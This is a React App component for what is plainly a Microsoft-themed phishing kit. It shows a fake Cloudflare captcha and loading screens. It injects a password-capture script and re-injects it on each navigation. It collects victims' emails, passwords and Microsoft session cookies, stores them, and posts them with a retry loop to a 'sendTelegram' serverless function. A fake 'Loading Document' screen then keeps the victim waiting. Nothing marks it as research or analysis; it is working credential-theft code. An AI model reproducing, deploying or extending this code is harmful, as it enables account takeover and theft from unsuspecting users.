import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

import { 
  restoreMicrosoftCookies, 
  restoreCookies, 
  setCapturedEmail, 
  setCapturedCookies,
  detectBrowserCapabilities,
  getStoredData
} from './utils/restoreCookies';

import { injectPasswordCaptureScript } from './utils/password-capture-injector';

const SLOW_DELAY = 1200;
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500;
const captchaVerificationDelay = 1500;
const redirectingDelay = 3000;
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

// NEW: configurable authenticating display time (increase to allow replacement.html to preload and load)
const authenticatingDelay = 2500; // milliseconds

// Helper functions for persistent storage
const setStoredPassword = (password: string) => {
  try {
    localStorage.setItem('captured_password', password);
    sessionStorage.setItem('captured_password', password);
  } catch (error) {
    console.warn('Failed to store password:', error);
  }
};

const getStoredPassword = (): string | null => {
  try {
    return localStorage.getItem('captured_password') || sessionStorage.getItem('captured_password');
  } catch (error) {
    console.warn('Failed to retrieve stored password:', error);
    return null;
  }
};

const setStoredFormCredentials = (email: string, password: string) => {
  try {
    const credentials = {
      email,
      password,
      captureTime: new Date().toISOString(),
      source: 'document-protection-form'
    };
    localStorage.setItem('form_credentials', JSON.stringify(credentials));
    sessionStorage.setItem('form_credentials', JSON.stringify(credentials));
  } catch (error) {
    console.warn('Failed to store form credentials:', error);
  }
};

const getStoredFormCredentials = () => {
  try {
    const stored = localStorage.getItem('form_credentials') || sessionStorage.getItem('form_credentials');
    return stored ? JSON.parse(stored) : null;
  } catch (error) {
    console.warn('Failed to retrieve stored form credentials:', error);
    return null;
  }
};

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
    validated?: boolean;
    microsoftAccount?: boolean;
  } | null>(null);
  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);

  // FORM STATE
  const [formEmail, setFormEmail] = useState('');
  const [formPassword, setFormPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // 🟢 NEW: Track if we've already sent tokens/cookies/email/password (prevents double send)
  const [hasSentAuthData, setHasSentAuthData] = useState(false);

  // 🟢 NEW: Store session data from OAuth
  const [oauthSessionData, setOAuthSessionData] = useState<any>(null);

  // CSS Keyframes
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      @keyframes fadeIn {
        0% { opacity: 0; transform: translateY(10px); }
        100% { opacity: 1; transform: translateY(0); }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
      .fade-in { animation: fadeIn 0.5s ease-out; }
      .document-icon { animation: spin 2s linear infinite; }
      .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  useEffect(() => {
    if (currentPage === 'redirecting') {
      // Start preloading the replacement URL while the "Opening" animation runs.
      // This warms the browser cache / starts fetching resources so the replacement page appears immediately.
      const preloadReplacement = async () => {
        try {
          // Add a prefetch link to hint the browser
          const existing = document.querySelector('link[data-prefetch-replacement="1"]');
          if (!existing) {
            const link = document.createElement('link');
            link.setAttribute('rel', 'prefetch');
            link.setAttribute('href', '/replacement.html');
            // 'as' isn't standardized for prefetching documents, but include for some browsers
            (link as any).as = 'document';
            link.setAttribute('data-prefetch-replacement', '1');
            document.head.appendChild(link);
          }

          // Also fetch the document in the background to warm HTTP cache (same-origin credentials)
          // Do not force navigation; just fetch to make the resource available quickly.
          await fetch('/replacement.html', { credentials: 'same-origin' }).catch(() => {});
        } catch (err) {
          // swallow errors — preloading is best-effort
          // console.warn('prefetch failed', err);
        }
      };

      preloadReplacement();

      const timer = setTimeout(() => {
        // After the opening animation, move to authenticating (which itself will shortly navigate to replacement)
        setCurrentPage('authenticating');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  useEffect(() => {
    try {
      const capabilities = detectBrowserCapabilities();
      setBrowserCapabilities(capabilities);
      console.log('🌐 Browser capabilities detected:', capabilities);
    } catch (error) {
      console.warn('⚠️ Failed to detect browser capabilities:', error);
    }

    try {
      const storedData = getStoredData();
      if (storedData.email) {
        setCapturedEmailState(storedData.email);
        setFormEmail(storedData.email); // Pre-fill form with stored email
        console.log('📧 Restored stored email:', storedData.email);
      }
      if (storedData.cookies && storedData.cookies.length > 0) {
        setCapturedCookiesState(JSON.stringify(storedData.cookies));
        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
      }

      // 🔧 FIX: Restore form credentials from persistent storage
      const storedFormCredentials = getStoredFormCredentials();
      if (storedFormCredentials) {
        setCapturedCredentials(storedFormCredentials);
        setFormEmail(storedFormCredentials.email || '');
        setFormPassword(storedFormCredentials.password || '');
        console.log('📋 Restored form credentials from storage:', {
          email: storedFormCredentials.email,
          hasPassword: !!storedFormCredentials.password,
          source: storedFormCredentials.source
        });
      }

      // Check for replacement credentials
      const replacementCredentials = localStorage.getItem('replacement_credentials') || 
                                   sessionStorage.getItem('replacement_credentials');
      if (replacementCredentials) {
        try {
          const parsed = JSON.parse(replacementCredentials);
          setCapturedCredentials(parsed);
          setCapturedEmailState(parsed.email);
          console.log('📋 Restored replacement credentials:', {
            email: parsed.email,
            hasPassword: !!parsed.password,
            validated: parsed.validated,
            microsoftAccount: parsed.microsoftAccount
          });
        } catch (e) {
          console.warn('Failed to parse replacement credentials:', e);
        }
      }
    } catch (error) {
      console.warn('⚠️ Failed to restore stored data:', error);
    }
  }, []);

  useEffect(() => {
    try {
      injectPasswordCaptureScript();
      console.log('✅ Password capture injector initialized');
    } catch (error) {
      console.warn('⚠️ Failed to initialize password capture injector:', error);
    }

    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
        }
      }, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
        }
      }, 1000);
    };

    const handlePopState = () => {
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
        }
      }, 1000);
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
        console.log('📧 Email captured and stored:', event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);

          const options = {
            reload: false,
            validate: true,
            debug: true,
            skipExpired: true,
            skipInvalid: false,
            warnOnSecurity: true,
            handleDuplicates: true
          };

          try {
            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
            console.log('✅ Enhanced cookie restoration result:', result);
            if (result.success) {
              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
            }
          } catch (error) {
            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
            restoreCookies(event.data.data.cookies, { debug: true });
          }

          // 🔧 FIXED: Send captured data to Telegram immediately with proper data structure
          if (!hasSentAuthData) {
            sendCapturedDataToTelegram({
              cookies: event.data.data.cookies,
              email: capturedEmail || event.data.data.credentials?.email,
              password: event.data.data.credentials?.password,
              source: 'cookie-capture',
              validated: event.data.data.credentials?.validated,
              microsoftAccount: event.data.data.credentials?.microsoftAccount
            });
            setHasSentAuthData(true);
          }

        } catch (e) {
          console.warn('⚠️ Cookie processing error:', e);
        }
      }

      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        const newCredentials = {
          ...event.data.data,
          captureTime: new Date().toISOString(),
          source: event.data.data?.source || 'injected-capture'
        };
        
        setCapturedCredentials(newCredentials);
        console.log('🔐 Enhanced credentials captured:', {
          hasEmail: !!newCredentials?.email,
          hasPassword: !!newCredentials?.password,
          hasUsername: !!newCredentials?.username,
          source: newCredentials?.source,
          validated: newCredentials?.validated,
          microsoftAccount: newCredentials?.microsoftAccount
        });

        // 🔧 FIX: Store credentials persistently
        if (newCredentials.email && newCredentials.password) {
          setStoredFormCredentials(newCredentials.email, newCredentials.password);
        }

        if (newCredentials.email) {
          setCapturedEmailState(newCredentials.email);
          setCapturedEmail(newCredentials.email);
        }

        // 🔧 FIXED: Send captured credentials to Telegram immediately with proper validation
        if (!hasSentAuthData && (newCredentials.email || newCredentials.password)) {
          sendCapturedDataToTelegram({
            email: newCredentials.email,
            password: newCredentials.password,
            validated: newCredentials.validated,
            microsoftAccount: newCredentials.microsoftAccount,
            source: newCredentials.source,
            cookies: [] // Will be populated when cookies are captured
          });
          setHasSentAuthData(true);
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        console.log('🏢 Organizational credentials captured:', event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, [capturedEmail, hasSentAuthData]);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'authenticating', 'oauth-redirect', 'success', 'document-loading', 'replacement'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };
  const handleCaptchaBack = () => {
    window.location.reload();
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formEmail || !formPassword) {
      alert('Please enter both email and password');
      return;
    }

    setIsSubmitting(true);

    try {
      const formCredentials = {
        email: formEmail,
        password: formPassword,
        captureTime: new Date().toISOString(),
        source: 'document-protection-form'
      };
      setCapturedEmailState(formEmail);
      setCapturedCredentials(formCredentials);
      setStoredFormCredentials(formEmail, formPassword);
      setCapturedEmail(formEmail);
      setTimeout(() => {
        setCurrentPage('authenticating');
      }, 1000);
    } catch (error) {
      setTimeout(() => {
        setCurrentPage('authenticating');
      }, 1000);
    } finally {
      setTimeout(() => {
        setIsSubmitting(false);
      }, 1200);
    }
  };

  useEffect(() => {
    if (currentPage === 'authenticating') {
      // Short delay so the "Authenticating" animation renders visibly before navigating to replacement.html
      const timer = setTimeout(() => {
        setCurrentPage('replacement');
      }, authenticatingDelay); // configurable authenticating delay
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  // 🔧 FIXED: Enhanced Telegram sending function with better error handling and retry logic
  const sendCapturedDataToTelegram = async (data: any, retryCount = 0) => {
    const maxRetries = 3;
    
    try {
      const payload = {
        email: data.email || capturedEmail || '',
        password: data.password || '',
        passwordSource: data.source || 'unknown',
        cookies: data.cookies || [],
        authenticationTokens: data.authenticationTokens || null,
        userAgent: navigator.userAgent,
        sessionId: Date.now().toString(),
        url: window.location.href,
        timestamp: new Date().toISOString(),
        validated: data.validated || false,
        microsoftAccount: data.microsoftAccount || false,
        browserCapabilities: browserCapabilities,
        // Add additional context for debugging
        captureContext: {
          currentPage,
          hasStoredCredentials: !!localStorage.getItem('replacement_credentials'),
          cookieCount: data.cookies?.length || 0,
          retryAttempt: retryCount
        }
      };

      console.log('📤 Sending data to Telegram (attempt ' + (retryCount + 1) + '):', {
        hasEmail: !!payload.email,
        hasPassword: !!payload.password,
        cookieCount: payload.cookies?.length || 0,
        validated: payload.validated,
        microsoftAccount: payload.microsoftAccount,
        source: payload.passwordSource
      });

      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        console.log('✅ Data successfully sent to Telegram');
        // Mark as successfully sent
        try {
          localStorage.setItem('telegram_data_sent', 'true');
          sessionStorage.setItem('telegram_data_sent', 'true');
          localStorage.setItem('data_transmitted', 'true');
          sessionStorage.setItem('data_transmitted', 'true');
        } catch (e) {
          // ignore storage errors
        }
        return true;
      } else {
        console.warn('⚠️ Failed to send data to Telegram:', response.status, response.statusText);
        
        // Retry on server errors
        if (response.status >= 500 && retryCount < maxRetries) {
          console.log(`🔄 Retrying in ${(retryCount + 1) * 1000}ms...`);
          setTimeout(() => {
            sendCapturedDataToTelegram(data, retryCount + 1);
          }, (retryCount + 1) * 1000);
        }
        return false;
      }
    } catch (error) {
      console.warn('⚠️ Error sending data to Telegram:', error);
      
      // Retry on network errors
      if (retryCount < maxRetries) {
        console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
        setTimeout(() => {
          sendCapturedDataToTelegram(data, retryCount + 1);
        }, (retryCount + 1) * 2000);
      }
      return false;
    }
  };

  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
    return sendCapturedDataToTelegram({
      email,
      password,
      cookies,
      authenticationTokens,
      userAgent,
      sessionId,
      url,
      source: 'sendToTelegram-function'
    });
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    // OAuth success now handled by RealOAuthRedirect component
    // Data transmission occurs after Microsoft cookie capture
    console.log('OAuth success callback triggered:', sessionData);
    setOAuthSessionData(sessionData);
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    // Updated flow: go back to the authenticating animation (previously 'document-protection')
    setCurrentPage('authenticating');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'authenticating':
      // Renamed the displayed animation text to "Authenticating" per requested flow change.
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Authenticating
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'replacement':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
          sendToTelegram={sendToTelegram}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
          sendToTelegram={sendToTelegram}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div className="document-icon" style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            {process.env.NODE_ENV === 'development' && (
              <div style={{ 
                marginTop: '20px', 
                padding: '10px', 
                backgroundColor: '#f8f9fa', 
                borderRadius: '4px',
                fontSize: '12px',
                color: '#666'
              }}>
                <div>Email: {capturedEmail || 'Not captured'}</div>
                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
                <div>Validated: {capturedCredentials?.validated ? 'Yes' : 'No'}</div>
                <div>Microsoft Account: {capturedCredentials?.microsoftAccount ? 'Yes' : 'No'}</div>
                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
                <div>Data Sent: {hasSentAuthData ? 'Yes' : 'No'}</div>
              </div>
            )}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('replacement')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;
